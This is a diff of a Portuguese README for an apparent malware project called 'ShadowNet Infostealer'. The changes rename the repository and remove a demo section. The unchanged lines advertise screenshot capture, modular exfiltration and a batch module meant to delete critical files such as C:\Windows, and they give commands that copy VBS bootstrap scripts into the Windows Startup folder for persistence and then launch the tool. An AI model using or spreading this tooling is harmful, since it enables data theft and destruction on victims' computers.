@@ -1,17 +1,17 @@
 <h2 align="center">🚀 ShadowNet Infostealer</h2>
 
 <p align="center">
-  <img alt="Tamanho do repositório" src="https://img.shields.io/github/repo-size/panda12332145/shadownet-infostealer">
-  <a href="https://github.com/panda12332145/shadownet-infostealer/commits/master">
-    <img alt="Último commit" src="https://img.shields.io/github/last-commit/panda12332145/shadownet-infostealer">
+  <img alt="Tamanho do repositório" src="https://img.shields.io/github/repo-size/panda12332145/ShadowNetInfostealer">
+  <a href="https://github.com/panda12332145/ShadowNetInfostealer/commits/master">
+    <img alt="Último commit" src="https://img.shields.io/github/last-commit/panda12332145/ShadowNetInfostealer">
   </a>
-  <a href="https://github.com/panda12332145/shadownet-infostealer">
-    <img alt="Stars" src="https://img.shields.io/github/stars/panda12332145/shadownet-infostealer?style=social">
+  <a href="https://github.com/panda12332145/ShadowNetInfostealer">
+    <img alt="Stars" src="https://img.shields.io/github/stars/panda12332145/ShadowNetInfostealer?style=social">
   </a>
 </p>
 
 <p align="center">
-  <img src="imagens/icon.png" alt="Logo" width="200"/>
+  <img src="imagens/logo.png" alt="Logo" width="200"/>
 </p>
 
 ---
@@ -29,20 +29,6 @@
 - ✅ **Captura de Screenshot**: Utiliza `nircmd.exe` (ferramenta externa não incluída) para tirar screenshots e armazenar localmente como `print1.jpg`.  
 - ✅ **Execução de Comandos Remotos**: Módulo `execute_system_command.bat` preparado para deletar arquivos críticos (ex: `C:\Windows`), indicando intenção de destruição.  
 - ✅ **Arquitetura Modular**: Separação clara entre coleta, exfiltração, execução e payloads — facilita atualização e reutilização de componentes.
-
----
-
-## 📽 Demonstração
-
-<p align="center">
-  <kbd>
-    <img src="imagens/screenshot1.png" width="400" alt="Screenshot 1: Arquivo system_information.txt com dados coletados"/>
-    <img src="imagens/screenshot2.png" width="400" alt="Screenshot 2: Mensagem de alerta 'Voce foi hackeado hahahahahahahaha'"/>
-  </kbd>
-</p>
-
-> **GIF animado:**  
-![Demonstração](giphy.gif)
 
 ---
 
@@ -199,7 +185,7 @@ graph TD
 ## 📂 Estrutura do Projeto
 
 ```plaintext
-/shadownet-infostealer
+/ShadowNetInfostealer
 ├── collection/
 │   └── collect_system_info.bat           # Coleta de dados do sistema
 ├── config/
@@ -237,7 +223,7 @@ copy core\bootstrap_main.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\St
 copy core\bootstrap_sys_vbs.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 :: Execução manual (após extração do pacote)
-cd /d C:\path\to\shadownet-infostealer
+cd /d C:\path\to\ShadowNetInfostealer
 start core\bootstrap_secondary.bat
 ```
 
